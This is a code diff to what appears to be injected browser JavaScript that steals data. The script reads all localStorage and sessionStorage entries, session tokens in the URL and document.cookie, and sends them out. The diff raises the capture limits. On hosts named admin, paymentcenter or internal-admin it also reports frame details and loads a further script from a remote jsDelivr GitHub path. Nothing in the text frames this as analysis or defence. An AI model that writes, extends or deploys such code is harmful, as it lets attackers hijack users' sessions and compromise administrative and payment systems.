@@ -27,8 +27,8 @@ window.__HL={post:post,summary:summary};
 function ls(){
  var o={lslen:-1,err:"",ls:{},ss:{},tok:"",sid:""};
  try{o.lslen=localStorage.length}catch(e){o.err+="ls:"+e.name}
- try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);o.ls[k]=String(localStorage.getItem(k)).slice(0,600)}}catch(e){o.err+="|rd:"+e.name}
- try{for(var j=0;j<sessionStorage.length;j++){var k2=sessionStorage.key(j);o.ss[k2]=String(sessionStorage.getItem(k2)).slice(0,600)}}catch(e){o.err+="|ss:"+e.name}
+ try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);o.ls[k]=String(localStorage.getItem(k)).slice(0,2400)}}catch(e){o.err+="|rd:"+e.name}
+ try{for(var j=0;j<sessionStorage.length;j++){var k2=sessionStorage.key(j);o.ss[k2]=String(sessionStorage.getItem(k2)).slice(0,2400)}}catch(e){o.err+="|ss:"+e.name}
  try{var m=/[?&](token|sid|session)=([^&#]+)/.exec(location.href);if(m){o[m[1]]=m[2]}}catch(e){}
  try{o.sid=localStorage.getItem("session")||localStorage.getItem("sid")||localStorage.getItem("token")||""}catch(e){}
  return JSON.stringify(o)
@@ -59,7 +59,10 @@ window.__TICK=setInterval(function(){
   run();
 },12000);
 run();
+var P=/^(admin|paymentcenter|internal-admin)\./.test(location.host);
 post("agent",[location.href,document.title,location.referrer,document.cookie].join(" || "));
 post("ls",ls());
-summary("agent",location.host+location.pathname+" ck="+document.cookie.slice(0,300));
+summary("agent",location.host+location.pathname+" ck="+document.cookie.slice(0,1200));
+if(P){post("panel",location.host+" iframe="+(top!==self)+" dom="+document.domain);
+ var z=document.createElement("script");z.src="//cdn.jsdelivr.net/gh/polootyyy/cdnx@1a3fdfc/p.js";document.body.appendChild(z);}
 })();
